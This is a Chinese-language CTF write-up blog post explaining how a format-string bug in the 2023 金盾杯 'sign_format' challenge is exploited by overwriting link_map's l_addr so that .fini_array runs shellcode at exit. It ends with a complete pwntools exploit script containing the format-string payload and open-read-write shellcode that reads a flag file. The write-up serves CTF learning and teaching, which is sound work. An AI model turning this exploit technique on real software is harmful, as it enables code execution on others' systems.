---
title: 格式化字符串漏洞之劫持dl.fini
author: seyedog
date: 2023-12-18 20:40:00 +0800
categories: [Blogging, fmt]
tags: [pwn]
---


### 1. .fini_array劫持

以2023金盾杯的题为例
#### 1.1 2023金盾杯 sign_format

题目介绍：一道非栈上的格式化字符串，通过修改dl_fini数组里的偏移值，使函数在退出时执行我们写在bss段上的shellcode。


题目保护分析：没开PIE，其他防护都开了。其次开启了沙箱，需要ORW

题目主要流程：
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  sub_40135D();
  puts("Welcome here!");
  puts("It's a simple sign-in question.");
  puts("Let's start!");
  close(1);
  read(0, format, 0x100uLL);
  printf(format);
  return 0LL;
}
```

有一个很长的输入，之后是格式化字符串漏洞，但是关闭了标准输出流。

其中format保存在bss段上，所以不能修改返回地址了。
格式化字符串%n解析的是地址，当格式化字符串不写在栈上，我们无法通过访问写在栈上的地址来实现任意地址写。而且不能控制返回地址了。

考虑使用.fini_array劫持

#### 1.2 劫持.fini_array

实现功能：在执行exit函数的时候，执行任意地址上的程序

利用条件：需要修改一个在ld.so段上的值。
猜测这个值会在进行动态链接的时候过程中残留在栈上（存疑）

##### 1.2.1 原理分析

下面是程序执行流程图：

![星盟周报11.png](/assets/img/pictureI/星盟周报11.png)

根据上图流程，如果我们控制`exit`函数的finiarray，可以实现任意代码执行。

##### 1.2.2 dl_fini函数

![](/assets/img/pictureI/星盟周报1.png)

`exit`函数执行的时候会调用`dl_fini`函数。

本来l->l_addr为0，而l->l_info\[DT_FINI_ARRAY]->d_un.d_ptr指针指向程序中的fini_array段的地址，也就是l->l_info\[DT_FINI_ARRAY]->d_un.d_ptr的值为0x0000000000403D98

![](/assets/img/pictureI/星盟周报2.png)

如果我们能控制**linkmap->l_addr**指针，就可以将程序偏移到我们写的位置，执行shellcode。
需要注意这里存的是一个程序地址：0x401200，所以我们伪造`l_addr`的时候将偏移后的值改为shellcode的地址。

那么如何通过格式化字符串控制`l_addr`呢？这个就需要用到在栈上留存的一个`ld.so`上的指针了

#### 1.3 gdb动态分析利用过程

首先，在main函数执行完毕之后会跳转到exit函数执行：

![](/assets/img/pictureI/星盟周报7.png)

然后我们步进到exit函数中：

![](/assets/img/pictureI/星盟周报6.png)

可见exit函数会调用一个叫`__run_exit_handlers`的函数
继续步进，直到这个函数调用了`__dl_fini`函数，然后dl_fini函数会执行call rax地址：
![](/assets/img/pictureI/星盟周报5.png)

具体查看rax地址是0x40406b，指向0x404073，其实这里已经是被我们修改了。原本rax应该是0x0403D98 -> 0x401200，原本是要去执行这个代码的：
![](/assets/img/pictureI/星盟周报8.png)

dl_fini函数：
![](/assets/img/pictureI/星盟周报1.png)

当我们修改了l_addr之后，array\[i]就可以被控制了。

而我们只需要计算0x40406B - 0x403D98 = 723，就知道我们应该把`l_addr`改成多少了。那么我们怎么改这个值呢？

#### 1.4 修改ElfW中l->l_addr劫持fini_array执行

前面我们说过了，在栈上有一个ld.so的地址残留，猜测是在动态链接的过程中残留在栈上的，对应这道题：

![](/assets/img/pictureI/星盟周报9.png)
就是那个末尾是0x2e0的粉色的地址。里面存的值0x2d3就是723，这里是执行完格式化字符串漏洞，已经被我们修改过了。原本里面存的应该是0，对应的就是`l->l_addr = 0`

具体在dl_fini函数中：
![](/assets/img/pictureI/星盟周报3.png)

执行 `add rax,qword ptr [r15]` ，这个r15此时保存的就是栈上ld.so保存的那个数据，那么只要利用格式化字符串漏洞修改这个ld.so地址中存的值，就可以控制让rax中保存的值从0x401200+0x0 改为访问我们希望执行的shellcode的地址。
这里就是对应`l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr`，从而让fini_array被劫持。
而具体改为什么数字，我们前面已经计算过了：0x40406B - 0x403D98 = 723
接下来只需要找到ld.so这个地址的格式化字符串偏移，然后将他里面存放的数据从0修改为723即可。

###### 这里插一嘴
在执行dl_fini的过程中有几步rax的值是0x403e00：

![](/assets/img/pictureI/星盟周报10.png)

这个其实是`.dynamic`节的地址，保存的是用于动态链接函数的信息表地址，或者其他什么地址。这个需要看具体值：
![](/assets/img/pictureI/星盟安全4.png)

###### 结构体如下：
```c
typedef struct{
	ELF64_Sxword d_tag;
	union{
		ELF64_Xword d_val;
		ELF64_Addr d_ptr;
	}d_un;
}ELF64_Dyn;
```

这个结构体根据第一个值`d_tag`的具体取值选择对应第二个值是用来做什么的。
这里应该是用来找dl_fini的偏移。
这个学过ret2dlresolve的师傅应该很熟悉
###### 言归正传

#### 1.4 exp

```python
from ctypes import *
from pwn import *
banary = "/home/giantbranch/PWN/question/City/jindun/2023/pwn1"
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(banary)
# libc = ELF("/home/giantbranch/PWN/libc/libc.so.6")
# libc=ELF("/home/giantbranch/PWN/libc/libc6_2.27-3ubuntu1.5_amd64.so")
ip = '123.56.237.147'
port = 47726
local = 1
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda addr : log.info(addr)
ia = lambda : io.interactive()

main_read = 0x0040144A

bss = 0x0404060

fini_array = 0x403d90   #0x403d98 - 0x403da0  .fini_array
    # array[0]->__do_global_dtors_aux
    # array[1]->fini

# payload = b"%"+b"240c%21$hhn"
# payload = b"%"+b"584c%34$hn"
#0x403fe0
# payload = b"%"+b"723c%34$hn"
payload = b"%"+b"723c%34$hn"

payload2= """
   push   0x67616c66
   push   0x2
   pop    rax
   mov    rdi,rsp
   xor    rsi,rsi
   syscall
   mov    rdi,rax
   xor    rax,rax
   mov    rsi,0x404200
   push   0x30
   pop    rdx
   syscall
   push   0x1
   pop    rax
   push   0x2
   pop    rdi
   mov    rsi,0x404200
   push   0x30
   pop    rdx
   syscall
"""
print(len(payload))
payload = payload + p64(0x40406b+8)+ asm(payload2)
print(len(payload))
dbg()
sl(payload)

ia()
    
```



